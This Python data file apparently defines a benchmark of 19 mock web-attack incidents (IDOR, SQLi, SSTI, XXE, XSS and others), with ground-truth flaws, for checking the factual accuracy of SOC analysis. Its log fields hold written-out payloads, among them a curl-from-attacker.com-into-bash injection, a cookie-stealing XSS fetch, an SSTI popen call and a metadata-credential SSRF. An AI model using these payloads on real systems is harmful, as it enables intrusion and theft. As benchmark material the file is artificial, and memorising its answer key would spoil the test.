"""
Ground-truth benchmark dataset of 19 code-based attack categories for SOC Hallucination & Factuality Verification.
Each incident contains verifiable telemetry fields, branch scores, and known ground-truth root flaws.
"""

from __future__ import annotations

from typing import Any, Dict, List
from schemas.incident import IncidentRecord, TimelineEvent

BENCHMARK_19_INCIDENTS: List[Dict[str, Any]] = [
    # 1. Broken Object Level Authorization (IDOR / BOLA)
    {
        "category_id": "01_BOLA_IDOR",
        "name": "Broken Object Level Authorization (BOLA / IDOR)",
        "ground_truth_flaw": "Missing object-level tenancy authorization check on /api/v1/user/{id}/profile",
        "ground_truth_entry": "GET /api/v1/user/1042/profile from authenticated session 8892",
        "incident": IncidentRecord(
            incident_id="INC-VERIF-01-BOLA",
            timestamp="2026-09-04T12:00:00Z",
            category="IDOR",
            severity="HIGH",
            confidence=0.94,
            contributing_branch_scores={"semantic": 0.96, "sequence": 0.84, "statistical": 0.90},
            raw_log_details={"endpoint": "/api/v1/user/1042/profile", "method": "GET", "status_code": 200, "source_ip": "198.51.100.42", "auth_sub": "8892"},
            timeline_events=[
                TimelineEvent(timestamp="2026-09-04T11:58:00Z", action="POST /api/v1/auth/login", source_ip="198.51.100.42", status_code=200, user_id="8892"),
                TimelineEvent(timestamp="2026-09-04T12:00:00Z", action="GET /api/v1/user/1042/profile", source_ip="198.51.100.42", status_code=200, user_id="8892"),
            ],
            affected_endpoints=["/api/v1/user/{id}/profile"],
            affected_entities=["user:1042"],
        )
    },

    # 2. SQL Injection (SQLi)
    {
        "category_id": "02_SQLI",
        "name": "SQL Injection (SQLi)",
        "ground_truth_flaw": "Unescaped string concatenation in search query controller",
        "ground_truth_entry": "POST /api/v1/search with UNION SELECT payload",
        "incident": IncidentRecord(
            incident_id="INC-VERIF-02-SQLI",
            timestamp="2026-09-04T12:05:00Z",
            category="SQLi",
            severity="CRITICAL",
            confidence=0.98,
            contributing_branch_scores={"semantic": 0.99, "sequence": 0.92},
            raw_log_details={"endpoint": "/api/v1/search", "method": "POST", "status_code": 500, "source_ip": "203.0.113.88", "payload_snippet": "' UNION SELECT username, password_hash FROM users --"},
            timeline_events=[TimelineEvent(timestamp="2026-09-04T12:05:00Z", action="POST /api/v1/search", source_ip="203.0.113.88", status_code=500)],
            affected_endpoints=["/api/v1/search"],
            affected_entities=["db:users"],
        )
    },

    # 3. Remote Code Execution (RCE / Command Injection)
    {
        "category_id": "03_RCE",
        "name": "Remote Code Execution / OS Command Injection",
        "ground_truth_flaw": "Unsanitized system shell execution in document conversion utility",
        "ground_truth_entry": "POST /api/v1/export/pdf with shell metacharacters in filename parameter",
        "incident": IncidentRecord(
            incident_id="INC-VERIF-03-RCE",
            timestamp="2026-09-04T12:10:00Z",
            category="RCE",
            severity="CRITICAL",
            confidence=0.99,
            contributing_branch_scores={"semantic": 0.99, "statistical": 0.95},
            raw_log_details={"endpoint": "/api/v1/export/pdf", "method": "POST", "status_code": 200, "source_ip": "198.51.100.99", "payload_snippet": "filename=doc; curl http://attacker.com/rev.sh | bash"},
            affected_endpoints=["/api/v1/export/pdf"],
        )
    },

    # 4. Server-Side Request Forgery (SSRF)
    {
        "category_id": "04_SSRF",
        "name": "Server-Side Request Forgery (SSRF)",
        "ground_truth_flaw": "Unvalidated webhook URL allowing internal network loopback queries",
        "ground_truth_entry": "POST /api/v1/webhooks/test targeting AWS metadata endpoint 169.254.169.254",
        "incident": IncidentRecord(
            incident_id="INC-VERIF-04-SSRF",
            timestamp="2026-09-04T12:15:00Z",
            category="SSRF",
            severity="CRITICAL",
            confidence=0.95,
            contributing_branch_scores={"semantic": 0.97, "graph": 0.91},
            raw_log_details={"endpoint": "/api/v1/webhooks/test", "method": "POST", "status_code": 200, "source_ip": "198.51.100.55", "target_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
            affected_endpoints=["/api/v1/webhooks/test"],
        )
    },

    # 5. Broken Authentication (JWT Signature Flaw)
    {
        "category_id": "05_BROKEN_AUTH",
        "name": "Broken Authentication (JWT Alg None / Missing Signature)",
        "ground_truth_flaw": "API gateway accepts unsigned JWT tokens with 'alg': 'none'",
        "ground_truth_entry": "GET /api/v1/admin/dashboard with forged alg:none bearer token",
        "incident": IncidentRecord(
            incident_id="INC-VERIF-05-AUTH",
            timestamp="2026-09-04T12:20:00Z",
            category="BROKEN_AUTHENTICATION",
            severity="HIGH",
            confidence=0.92,
            contributing_branch_scores={"semantic": 0.94, "sequence": 0.88},
            raw_log_details={"endpoint": "/api/v1/admin/dashboard", "method": "GET", "status_code": 200, "source_ip": "203.0.113.14", "jwt_header": "{\"alg\":\"none\"}"},
            affected_endpoints=["/api/v1/admin/dashboard"],
        )
    },

    # 6. Mass Assignment (BFLA Property Tampering)
    {
        "category_id": "06_MASS_ASSIGNMENT",
        "name": "Mass Assignment / Privilege Escalation",
        "ground_truth_flaw": "DTO deserializer blindly binds 'is_admin': true to database user model",
        "ground_truth_entry": "PUT /api/v1/user/profile including unauthorized is_admin field",
        "incident": IncidentRecord(
            incident_id="INC-VERIF-06-MASS",
            timestamp="2026-09-04T12:25:00Z",
            category="MASS_ASSIGNMENT",
            severity="HIGH",
            confidence=0.89,
            contributing_branch_scores={"semantic": 0.93, "statistical": 0.82},
            raw_log_details={"endpoint": "/api/v1/user/profile", "method": "PUT", "status_code": 200, "source_ip": "198.51.100.12", "payload_snippet": "{\"name\": \"Alice\", \"is_admin\": true, \"role\": \"superuser\"}"},
            affected_endpoints=["/api/v1/user/profile"],
        )
    },

    # 7. Broken Function Level Authorization (BFLA)
    {
        "category_id": "07_BFLA",
        "name": "Broken Function Level Authorization (BFLA)",
        "ground_truth_flaw": "Missing administrative role enforcement on user deletion endpoint",
        "ground_truth_entry": "DELETE /api/v1/admin/users/4412 executed by standard user",
        "incident": IncidentRecord(
            incident_id="INC-VERIF-07-BFLA",
            timestamp="2026-09-04T12:30:00Z",
            category="BFLA",
            severity="HIGH",
            confidence=0.93,
            contributing_branch_scores={"semantic": 0.95, "sequence": 0.89},
            raw_log_details={"endpoint": "/api/v1/admin/users/4412", "method": "DELETE", "status_code": 204, "source_ip": "198.51.100.77", "caller_role": "STANDARD_USER"},
            affected_endpoints=["/api/v1/admin/users/{id}"],
        )
    },

    # 8. Unrestricted Resource Consumption (Rate Limit Bypass)
    {
        "category_id": "08_RATE_LIMIT",
        "name": "Rate Limit Bypass / Resource Exhaustion",
        "ground_truth_flaw": "Rate limiter uses spoofable X-Forwarded-For header allowing burst DoS",
        "ground_truth_entry": "POST /api/v1/sms/send-otp with rotating X-Forwarded-For headers",
        "incident": IncidentRecord(
            incident_id="INC-VERIF-08-RATE",
            timestamp="2026-09-04T12:35:00Z",
            category="RATE_LIMIT_BYPASS",
            severity="MEDIUM",
            confidence=0.88,
            contributing_branch_scores={"statistical": 0.98, "sequence": 0.85},
            raw_log_details={"endpoint": "/api/v1/sms/send-otp", "method": "POST", "status_code": 200, "source_ip": "203.0.113.200", "requests_per_sec": 85},
            affected_endpoints=["/api/v1/sms/send-otp"],
        )
    },

    # 9. Server-Side Template Injection (SSTI)
    {
        "category_id": "09_SSTI",
        "name": "Server-Side Template Injection (SSTI)",
        "ground_truth_flaw": "Jinja2 template evaluates user input string directly without sandboxing",
        "ground_truth_entry": "GET /api/v1/render?template={{7*7}} resulting in evaluated output 49",
        "incident": IncidentRecord(
            incident_id="INC-VERIF-09-SSTI",
            timestamp="2026-09-04T12:40:00Z",
            category="RCE",
            severity="CRITICAL",
            confidence=0.96,
            contributing_branch_scores={"semantic": 0.98, "statistical": 0.90},
            raw_log_details={"endpoint": "/api/v1/render", "method": "GET", "status_code": 200, "source_ip": "198.51.100.33", "query": "template={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"},
            affected_endpoints=["/api/v1/render"],
        )
    },

    # 10. Path Traversal (Directory Traversal)
    {
        "category_id": "10_PATH_TRAVERSAL",
        "name": "Path Traversal / Local File Inclusion",
        "ground_truth_flaw": "Unsanitized filepath parameter allowing ../ escape to /etc/passwd",
        "ground_truth_entry": "GET /api/v1/files/download?path=../../../../etc/passwd",
        "incident": IncidentRecord(
            incident_id="INC-VERIF-10-TRAVERSAL",
            timestamp="2026-09-04T12:45:00Z",
            category="INFORMATION_DISCLOSURE",
            severity="HIGH",
            confidence=0.94,
            contributing_branch_scores={"semantic": 0.98, "sequence": 0.86},
            raw_log_details={"endpoint": "/api/v1/files/download", "method": "GET", "status_code": 200, "source_ip": "203.0.113.44", "path_param": "../../../../etc/passwd"},
            affected_endpoints=["/api/v1/files/download"],
        )
    },

    # 11. XML External Entity (XXE Injection)
    {
        "category_id": "11_XXE",
        "name": "XML External Entity (XXE)",
        "ground_truth_flaw": "XML parser has external entity resolution (DOCTYPE SYSTEM) enabled",
        "ground_truth_entry": "POST /api/v1/xml/import with DOCTYPE external entity URI",
        "incident": IncidentRecord(
            incident_id="INC-VERIF-11-XXE",
            timestamp="2026-09-04T12:50:00Z",
            category="SSRF",
            severity="HIGH",
            confidence=0.91,
            contributing_branch_scores={"semantic": 0.95, "statistical": 0.85},
            raw_log_details={"endpoint": "/api/v1/xml/import", "method": "POST", "status_code": 200, "source_ip": "198.51.100.80", "payload_snippet": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://169.254.169.254/'>]>"},
            affected_endpoints=["/api/v1/xml/import"],
        )
    },

    # 12. Stored Cross-Site Scripting (XSS)
    {
        "category_id": "12_STORED_XSS",
        "name": "Stored Cross-Site Scripting (XSS)",
        "ground_truth_flaw": "HTML output unescaped in customer comment component",
        "ground_truth_entry": "POST /api/v1/comments with <script>alert(document.cookie)</script>",
        "incident": IncidentRecord(
            incident_id="INC-VERIF-12-XSS",
            timestamp="2026-09-04T12:55:00Z",
            category="SECURITY_MISCONFIGURATION",
            severity="MEDIUM",
            confidence=0.87,
            contributing_branch_scores={"semantic": 0.92, "statistical": 0.78},
            raw_log_details={"endpoint": "/api/v1/comments", "method": "POST", "status_code": 201, "source_ip": "198.51.100.91", "payload_snippet": "<img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>"},
            affected_endpoints=["/api/v1/comments"],
        )
    },

    # 13. Open Redirect (Unvalidated Redirection)
    {
        "category_id": "13_OPEN_REDIRECT",
        "name": "Unvalidated Open Redirect",
        "ground_truth_flaw": "Login redirect URL does not restrict to trusted host domains",
        "ground_truth_entry": "GET /api/v1/auth/callback?redirect_url=https://evil-phishing.com",
        "incident": IncidentRecord(
            incident_id="INC-VERIF-13-REDIRECT",
            timestamp="2026-09-04T13:00:00Z",
            category="SECURITY_MISCONFIGURATION",
            severity="LOW",
            confidence=0.82,
            contributing_branch_scores={"semantic": 0.88, "statistical": 0.74},
            raw_log_details={"endpoint": "/api/v1/auth/callback", "method": "GET", "status_code": 302, "source_ip": "203.0.113.11", "redirect_url": "https://evil-phishing.com/harvest"},
            affected_endpoints=["/api/v1/auth/callback"],
        )
    },

    # 14. Insecure Deserialization
    {
        "category_id": "14_DESERIALIZATION",
        "name": "Insecure Object Deserialization",
        "ground_truth_flaw": "Pickle / Java ObjectInputStream deserializes untrusted cookie payload",
        "ground_truth_entry": "GET /api/v1/session/restore with base64 serialized exploit gadget",
        "incident": IncidentRecord(
            incident_id="INC-VERIF-14-DESERIAL",
            timestamp="2026-09-04T13:05:00Z",
            category="RCE",
            severity="CRITICAL",
            confidence=0.97,
            contributing_branch_scores={"semantic": 0.99, "statistical": 0.92},
            raw_log_details={"endpoint": "/api/v1/session/restore", "method": "GET", "status_code": 200, "source_ip": "198.51.100.64", "cookie_header": "session=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA..."},
            affected_endpoints=["/api/v1/session/restore"],
        )
    },

    # 15. Security Misconfiguration (CORS Wildcard & Verbose Traces)
    {
        "category_id": "15_MISCONFIG",
        "name": "Security Misconfiguration (CORS Wildcard + Credentials)",
        "ground_truth_flaw": "Access-Control-Allow-Origin dynamically mirrors origin with Allow-Credentials: true",
        "ground_truth_entry": "OPTIONS /api/v1/billing with Origin: https://evil.com",
        "incident": IncidentRecord(
            incident_id="INC-VERIF-15-CORS",
            timestamp="2026-09-04T13:10:00Z",
            category="SECURITY_MISCONFIGURATION",
            severity="MEDIUM",
            confidence=0.86,
            contributing_branch_scores={"semantic": 0.89, "statistical": 0.80},
            raw_log_details={"endpoint": "/api/v1/billing", "method": "OPTIONS", "status_code": 200, "source_ip": "203.0.113.99", "origin": "https://attacker-origin.com", "cors_header_returned": "Access-Control-Allow-Credentials: true"},
            affected_endpoints=["/api/v1/billing"],
        )
    },

    # 16. Credential Stuffing Campaign
    {
        "category_id": "16_CRED_STUFFING",
        "name": "Distributed Credential Stuffing",
        "ground_truth_flaw": "Absence of IP-reputation intelligence and distributed anomaly rate limiter on login route",
        "ground_truth_entry": "High-velocity POST /api/v1/auth/login across 200 proxy IPs",
        "incident": IncidentRecord(
            incident_id="INC-VERIF-16-STUFF",
            timestamp="2026-09-04T13:15:00Z",
            category="CREDENTIAL_STUFFING",
            severity="HIGH",
            confidence=0.91,
            contributing_branch_scores={"statistical": 0.98, "sequence": 0.89},
            raw_log_details={"endpoint": "/api/v1/auth/login", "method": "POST", "status_code": 401, "failed_count_1min": 340, "source_ip": "198.51.100.100"},
            campaign_id="CAMP-STUFF-DIST-16",
            affected_endpoints=["/api/v1/auth/login"],
        )
    },

    # 17. API Token Abuse / Key Scraping
    {
        "category_id": "17_TOKEN_ABUSE",
        "name": "API Token Abuse & Bulk Exfiltration",
        "ground_truth_flaw": "Exposed high-privilege read key lacking IP binding or per-minute burst quotas",
        "ground_truth_entry": "GET /api/v1/customers/export with key sk_live_public_leak",
        "incident": IncidentRecord(
            incident_id="INC-VERIF-17-TOKEN",
            timestamp="2026-09-04T13:20:00Z",
            category="API_TOKEN_ABUSE",
            severity="HIGH",
            confidence=0.90,
            contributing_branch_scores={"statistical": 0.94, "semantic": 0.85},
            raw_log_details={"endpoint": "/api/v1/customers/export", "method": "GET", "status_code": 200, "source_ip": "203.0.113.120", "api_key_prefix": "sk_live_..."},
            affected_endpoints=["/api/v1/customers/export"],
        )
    },

    # 18. GraphQL Introspection & Batching Abuse
    {
        "category_id": "18_GRAPHQL_ABUSE",
        "name": "GraphQL Introspection & Query Complexity DoS",
        "ground_truth_flaw": "Production GraphQL endpoint enables schema introspection and infinite circular nesting",
        "ground_truth_entry": "POST /graphql with __schema query and 100-deep nested author/posts probe",
        "incident": IncidentRecord(
            incident_id="INC-VERIF-18-GRAPHQL",
            timestamp="2026-09-04T13:25:00Z",
            category="API_ABUSE",
            severity="MEDIUM",
            confidence=0.88,
            contributing_branch_scores={"semantic": 0.92, "statistical": 0.81},
            raw_log_details={"endpoint": "/graphql", "method": "POST", "status_code": 200, "source_ip": "198.51.100.44", "query_depth": 14, "has_introspection": True},
            affected_endpoints=["/graphql"],
        )
    },

    # 19. Business Logic Tampering (Negative Checkout / Quantity Tampering)
    {
        "category_id": "19_BUSINESS_LOGIC",
        "name": "Business Logic Parameter Tampering (Negative Quantity)",
        "ground_truth_flaw": "Checkout service fails to validate quantity > 0, resulting in negative order credit",
        "ground_truth_entry": "POST /api/v1/cart/checkout with quantity: -5",
        "incident": IncidentRecord(
            incident_id="INC-VERIF-19-LOGIC",
            timestamp="2026-09-04T13:30:00Z",
            category="MASS_ASSIGNMENT",
            severity="HIGH",
            confidence=0.93,
            contributing_branch_scores={"semantic": 0.96, "statistical": 0.88},
            raw_log_details={"endpoint": "/api/v1/cart/checkout", "method": "POST", "status_code": 200, "source_ip": "198.51.100.15", "payload_snippet": "{\"item_id\": 992, \"quantity\": -5, \"price\": 100}"},
            affected_endpoints=["/api/v1/cart/checkout"],
        )
    },
]
